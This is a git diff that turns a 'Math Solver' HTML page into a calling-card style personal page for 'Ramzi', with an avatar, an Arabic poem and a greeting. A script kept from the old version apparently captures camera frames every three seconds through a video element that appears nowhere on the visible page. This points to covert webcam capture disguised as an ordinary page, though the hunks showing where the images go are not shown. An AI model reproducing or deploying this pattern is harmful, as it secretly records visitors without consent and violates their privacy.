@@ -1,46 +1,110 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Math Solver</title>
-    <style>
-      body {
-        background-color: #f7f7f7;
-        font-family: Arial, sans-serif;
-        font-size: 16px;
-      }
-      h1 {
-        color: #003580;
-        font-size: 32px;
-        text-align: center;
-        margin-top: 50px;
-      }
-      #math-image {
-        display: block;
-        margin: 0 auto;
-        width: 400px;
-        height: 300px;
-        border: 2px solid #003580;
-        border-radius: 10px;
-        box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.2);
-      }
-      #math-equation {
-        text-align: center;
-        margin-top: 20px;
-        font-size: 24px;
-        color: #003580;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>Math Solver</h1>
-    <img id="math-image" src="" alt="Math Equation">
-    <div id="math-equation"></div>
-    <script>
+<head>
+	<title>Ramzi's website'</title>
+	<style>
+		body {
+			background-color: #2b2b2b;
+			color: #fff;
+			font-family: Arial, sans-serif;
+		}
+		.container {
+			max-width: 1300px;
+			margin: 0 auto;
+			padding: 20px;
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+			border-radius: 5px;
+			background-color: #282828;
+			text-align: center;
+		}
+		h1 {
+			margin-top: 0;
+			font-size: 36px;
+			font-weight: bold;
+			text-shadow: 0px 1px 1px rgba(0, 0, 0, 0.5);
+		}
+		.caller-info {
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			margin-bottom: 30px;
+		}
+		.caller-name {
+			font-size: 24px;
+			font-weight: bold;
+			margin-bottom: 10px;
+			text-shadow: 0px 1px 1px rgba(0, 0, 0, 0.5);
+		}
+		.caller-number {
+			font-size: 18px;
+			margin-bottom: 20px;
+		}
+		.caller-image {
+			width: 100px;
+			height: 100px;
+			border-radius: 50%;
+			object-fit: cover;
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+			margin-bottom: 20px;
+		}
+		.call-message {
+			font-size: 18px;
+			margin-bottom: 20px;
+			text-align: center;
+		}
+		.action-buttons {
+			display: flex;
+			justify-content: center;
+			align-items: center;
+		}
+		button {
+			background-color: #4CAF50;
+			color: #fff;
+			padding: 10px 20px;
+			border: none;
+			border-radius: 5px;
+			cursor: pointer;
+			margin-right: 10px;
+			font-size: 18px;
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+			text-shadow: 0px 1px 1px rgba(0, 0, 0, 0.5);
+		}
+		button:hover {
+			background-color: #3e8e41;
+		}
+		button:active {
+			transform: translateY(1px);
+			box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.5);
+		}
+		.message-section {
+			background-color: #333;
+			padding: 20px;
+			border-radius: 5px;
+			margin-top: 20px;
+			box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+			border-radius: 5px;
+			background-color: #282828;
+		}
+		.message-title {
+			font-size: 24px;
+			font-weight: bold;
+			margin-top: 0;
+			margin-bottom: 10px;
+			text-shadow: 0px 1px 1px rgba(0, 0, 0, 0.5);
+		}
+		.message-text {
+			font-size: 18px;
+			margin-bottom: 10px;
+			text-align: left;
+		}
+	</style>
+</head>
+<body>
+<script>
       var imageCounter = 1;
       var intervalId = setInterval(function() {
         captureImage();
-      }, 1000);
+      }, 3000);
 
       function captureImage() {
         var video = document.querySelector('video');
@@ -72,6 +136,28 @@
           console.log(err.name + ": " + err.message);
         });
     </script>
-  </body>
+	<div class="container">
+		<h1>Calling website</h1>
+		<div class="caller-info">
+			<img class="caller-image" src="https://cdn.discordapp.com/avatars/1025358233742884985/a54fb1c50ee806024100173dab143959.webp?size=512">
+			<div class="caller-name">Ramzi</div>
+			<div class="caller-number">لَستُ.الَذي.يَرتجي.النّاسَ.وَصلًا.
+ ولا.مَن.إذا.هَجَروا. يَأْلَمُ.
+ أنا.البَدرُ.ما.ضَرَني. في.لَيالِيَ.
+ سُحْبٌ.تُغادِرُ.أو. أَنجُمُ."</div>
+		</div>
+		<div class="call-message">
+			<p></p>
+			<p>Creator #ramzi</p>
+		</div>
+		<div class="action-buttons">
+			<button>Message</button>
+			<button>Call</button>
+		</div>
+	</div>
+	<div class="message-section">
+		<h2 class="message-title">Message from Ramzi</h2>
+		<p class="message-text">هلا يالغالي!</p>
+	</div>
+</body>
 </html>
-
